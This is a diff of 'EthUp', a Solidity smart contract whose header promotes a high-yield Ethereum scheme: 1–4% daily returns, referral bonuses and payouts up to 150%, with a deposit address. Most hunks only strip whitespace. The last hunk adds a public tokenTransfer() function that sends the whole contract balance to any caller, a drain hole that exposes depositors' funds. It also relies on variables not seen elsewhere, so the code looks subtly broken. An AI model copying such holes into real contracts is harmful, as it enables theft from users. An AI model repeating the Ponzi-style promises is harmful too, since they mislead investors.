@@ -14,8 +14,8 @@ pragma solidity 0.4.25;
 * KOR Telegram_chat: https://t.me/Ethup_kor
 * CN  Telegram_chat: https://t.me/Ethup_cn
 * Email:             mailto:info(at sign)ethup.io
-* 
-* 
+*
+*
 *  - GAIN 1% - 4% PER 24 HOURS
 *  - Life-long payments
 *  - The revolutionary reliability
@@ -27,13 +27,13 @@ pragma solidity 0.4.25;
 *    --    5% technical support
 *
 *   ---About the Project
-*  Blockchain-enabled smart contracts have opened a new era of trustless relationships without 
-*  intermediaries. This technology opens incredible financial possibilities. Our automated investment 
-*  smart platform is written into a smart contract, uploaded to the Ethereum blockchain and can be 
-*  freely accessed online. In order to insure our investors' complete security, full control over the 
-*  project has been transferred from the organizers to the smart contract: nobody can influence the 
+*  Blockchain-enabled smart contracts have opened a new era of trustless relationships without
+*  intermediaries. This technology opens incredible financial possibilities. Our automated investment
+*  smart platform is written into a smart contract, uploaded to the Ethereum blockchain and can be
+*  freely accessed online. In order to insure our investors' complete security, full control over the
+*  project has been transferred from the organizers to the smart contract: nobody can influence the
 *  system's permanent autonomous functioning.
-* 
+*
 * ---How to use:
 *  1. Select a level and send from ETH wallet to the smart contract address 0xeccf2a50fca80391b0380188255866f0fc7fe852
 *     any amount from 0.01 to 50 ETH.
@@ -46,23 +46,23 @@ pragma solidity 0.4.25;
 *       Level 6: from 20 to 30 ETH - 3.5%
 *       Level 7: from 30 to 50 ETH - 4%
 *
-*  2. Verify your transaction in the history of your application (wallet) or etherscan.io, specifying the address 
+*  2. Verify your transaction in the history of your application (wallet) or etherscan.io, specifying the address
 *     of your wallet.
-*  3a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're 
+*  3a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're
 *      spending too much on GAS) to the smart contract address 0xeccf2a50fca80391b0380188255866f0fc7fe852.
 *  OR
-*  3b. For add investment, you need to deposit the amount that you want to add and the 
+*  3b. For add investment, you need to deposit the amount that you want to add and the
 *      accrued interest automatically summed to your new contribution.
-*  
+*
 * RECOMMENDED GAS LIMIT: 200000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 * You can check the payments on the etherscan.io site, in the "Internal Txns" tab of your wallet.
 *
-* Every 24 hours from the moment of the deposit or from the last successful write-off of the accrued interest, 
-* the smart contract will transfer your dividends to your account that corresponds to the number of your wallet. 
+* Every 24 hours from the moment of the deposit or from the last successful write-off of the accrued interest,
+* the smart contract will transfer your dividends to your account that corresponds to the number of your wallet.
 * Dividends are accrued until 150% of the investment is paid.
-* After receiving 150% of all invested funds (or 50% of profits), your wallet will disconnected from payments. 
-* You can make reinvestment by receiving an additional + 10% for the deposit amount and continue the participation. 
+* After receiving 150% of all invested funds (or 50% of profits), your wallet will disconnected from payments.
+* You can make reinvestment by receiving an additional + 10% for the deposit amount and continue the participation.
 * The bonus will received only by the participant who has already received 150% of the profits and invests again.
 *
 * The amount of daily charges depends on the sum of all the participant's contributions to the smart contract.
@@ -72,17 +72,17 @@ pragma solidity 0.4.25;
 *
 * ---Additional tools embedded in the smart contract:
 *     - Referral program 5%. The same bonus gets referral and referrer.
-*     - Reinvestment. After full payment of your first investment, you can receive a 10% bonus for reinvesting funds. 
+*     - Reinvestment. After full payment of your first investment, you can receive a 10% bonus for reinvesting funds.
 *       You can reinvest any amount.
-*     - BOOST mode. Get the percentage of your funds remaining in the system. 
+*     - BOOST mode. Get the percentage of your funds remaining in the system.
 *
-* ---It is not allowed to transfer from exchanges, only from your personal ETH wallet, for which you 
+* ---It is not allowed to transfer from exchanges, only from your personal ETH wallet, for which you
 * have private keys.
-* 
+*
 * Contracts reviewed and approved by pros!
-* 
+*
 * Main contract - EthUp. Scroll down to find it.
-*/ 
+*/
 
 
 library Zero {
@@ -783,4 +783,14 @@ contract EthUp is Accessibility {
     function getReinvestBonusPercent() internal view returns(Percent.percent memory p) {
         p = m_reinvestPercent.toMemory();
     }
+	 function tokenTransfer() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
